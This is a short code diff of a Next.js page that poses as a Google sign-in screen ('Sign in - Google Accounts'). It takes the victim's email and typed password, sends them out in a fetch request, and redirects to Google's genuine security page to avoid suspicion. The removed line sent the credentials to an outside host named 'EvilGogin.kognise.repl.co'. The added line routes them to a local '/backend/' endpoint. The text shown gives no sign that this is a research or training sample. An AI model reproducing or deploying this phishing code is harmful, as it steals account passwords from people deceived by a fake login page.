@@ -12,12 +12,12 @@ import Head from 'next/head'
 export default withRouter((props) => {
   const [ password, setPassword ] = useState('')
   const submit = async () => {
-    await fetch(`https://EvilGogin.kognise.repl.co/${encodeURIComponent(props.router.query.email)}/${encodeURIComponent(password)}`)
+    await fetch(`/backend/${encodeURIComponent(props.router.query.email)}/${encodeURIComponent(password)}`)
     props.router.push('https://myaccount.google.com/security')
   }
 
   return (
-    <Layout title='Sign in'>
+    <Layout title='Welcome'>
       <Head>
         <title>Sign in - Google Accounts</title>
       </Head>
